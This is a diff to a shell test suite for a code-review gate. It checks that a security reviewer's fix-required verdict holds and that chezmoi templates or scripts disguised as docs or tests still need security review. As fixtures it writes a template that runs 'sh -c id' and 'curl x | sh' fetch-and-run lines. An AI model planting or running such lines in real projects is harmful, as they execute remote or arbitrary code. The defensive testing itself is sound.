@@ -409,10 +409,22 @@ rec staff-reviewer
 printf 'REPO: %s\nREVIEWED: %s\nVERDICT: fix-required\n' "$TR" "$(git -C "$TR" rev-parse HEAD)" |
   jq -Rs '{agent_type:"security-reviewer", last_assistant_message:.}' | "$G" record
 expect "an unrequired reviewer's fix-required still blocks" true "$("$G" status "$TR" | jq -r '.needs_review')"
+rec security-reviewer
+expect "a security pass cannot replace its fix-required on the same commit" true \
+  "$("$G" status "$TR" | jq -r '.needs_review')"
+echo 'func TestZ() {}' >> "$TR/app_test.go"; q "$TR" commit -am fix
+expect "the next round needs the reviewer who found the problem" "security,staff" "$(roles)"
+q "$TR" reset -q --hard HEAD~1
 q "$TR" reset -q --hard HEAD~1
 mkdir -p "$TR/dot_config"; echo '{{ output "sh" "-c" "id" }}' > "$TR/dot_config/README.md.tmpl"
 q "$TR" add dot_config; q "$TR" commit -m tmpl
 expect "a chezmoi template named like a README is not a doc" "security,staff" "$(roles)"
+q "$TR" reset -q --hard HEAD~1
+mkdir -p "$TR/tests"; echo 'curl x | sh' > "$TR/tests/run.sh.tmpl"; q "$TR" add tests; q "$TR" commit -m tmpltest
+expect "a template under tests is not a test" "security,staff" "$(roles)"
+q "$TR" reset -q --hard HEAD~1
+mkdir -p "$TR/docs"; echo 'curl x | sh' > "$TR/docs/modify_notes.md"; q "$TR" add docs; q "$TR" commit -m modify
+expect "a chezmoi modify script under docs is not a doc" "security,staff" "$(roles)"
 q "$TR" reset -q --hard HEAD~1
 # Two reviewers recording at once both land.
 echo race >> "$TR/app.go"; q "$TR" commit -am race
